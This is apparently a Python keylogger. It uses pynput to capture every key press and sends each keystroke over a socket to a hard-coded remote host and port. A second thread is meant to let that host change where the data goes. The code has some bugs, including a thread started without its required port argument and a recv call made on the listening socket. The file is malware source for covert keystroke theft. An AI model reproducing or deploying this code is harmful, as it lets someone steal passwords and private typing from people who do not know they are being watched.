from pynput.keyboard import Key, Listener
import socket
import threading
import re

localHost = "10.64.83.186"
transferHost = "10.64.83.186"
port = 5051

transferSocket = socket.socket()
transferSocket.connect((transferHost, port))


def receive(port):
    receiveSocker = socket.socket()
    receiveSocker.bind((localHost, port))
    receiveSocker.listen(5)
    while True:
        c, addr = receiveSocker.accept()
        transferHost = receiveSocker.recv(20)
        # CHANGE IP
    receiveSocker.close()


def on_press(key):
    key = str(key).encode()
    transferSocket.send(key)
    # 监听按键
    # print('{0} pressed'.format(key))
    print(key)


def on_release(key):
    # 监听释放
    # print('{0} release'.format(key))
    # print(key)
    if key == Key.esc:
        # Stop listener
        return False


def transfer():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    # 连接事件以及释放
    transferThread = threading.Thread(target=transfer)
    transferThread.setDaemon(True)
    transferThread.start()
    receiveThread = threading.Thread(target=receive)
    receiveThread.setDaemon(True)
    receiveThread.start()
